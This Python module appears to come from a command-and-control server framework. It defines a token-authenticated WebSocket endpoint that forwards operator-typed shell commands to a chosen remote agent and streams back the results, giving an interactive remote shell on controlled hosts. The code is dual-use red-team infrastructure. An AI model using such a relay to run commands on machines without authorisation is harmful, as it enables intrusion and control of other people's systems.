from __future__ import annotations

import uuid

from darkscryc2server.models.messages import CommandIdentifiers
from darkscryc2server.utils.remote_manager import remote_send_command
from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from jose import JWTError, jwt

from ..core.settings import get_app_settings
from ..schemas.modules.execution import RunCommand

router = APIRouter()


async def _authenticate_ws(websocket: WebSocket) -> bool:
    token = websocket.query_params.get("token")
    if not token:
        return False
    settings = get_app_settings()
    try:
        jwt.decode(
            token,
            settings.secret_key,
            algorithms=["HS256"],
            issuer=settings.jwt_issuer,
            audience=settings.jwt_audience,
        )
        return True
    except JWTError:
        return False


@router.websocket("/ws/shell/{agent_id}")
async def shell_websocket(websocket: WebSocket, agent_id: uuid.UUID) -> None:
    if not await _authenticate_ws(websocket):
        await websocket.close(code=1008)
        return

    await websocket.accept()
    try:
        while True:
            data = await websocket.receive_json()
            command = data.get("command")
            if command is None:
                await websocket.send_json({"error": "No command"})
                continue
            result = await remote_send_command(
                agent_id=str(agent_id),
                action_id=CommandIdentifiers.RUN_COMMAND,
                command=RunCommand(command=command).model_dump(),
            )
            await websocket.send_json({"message": result.data})
    except WebSocketDisconnect:
        return
